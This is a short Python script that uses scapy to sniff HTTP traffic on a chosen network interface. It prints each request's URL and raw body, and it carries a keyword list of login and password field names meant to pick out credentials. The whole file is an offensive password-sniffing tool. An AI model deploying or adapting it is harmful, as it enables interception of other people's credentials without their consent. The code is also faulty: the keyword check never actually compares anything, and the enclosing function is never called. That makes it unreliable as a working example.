#!/usr/bin/env python3 
import scapy.all as scapy
from scapy.layers import http
def packet():
    print("\n****************************************************************")
    print("\n* Copyright of saai jeshwanth && nithesh, 2021 *")
    print("\n****************************************************************")
    def sniff():
        interface = input("Enter the interface :")
        scapy.sniff(iface=interface, store=False, prn=sniffed_packet)
    
    def sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
            print(url)
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keywords = ["username", "uname", "user", "login", "password", "pass"]
                for keyword in keywords:
                    print(load)
                    break
        
    sniff()
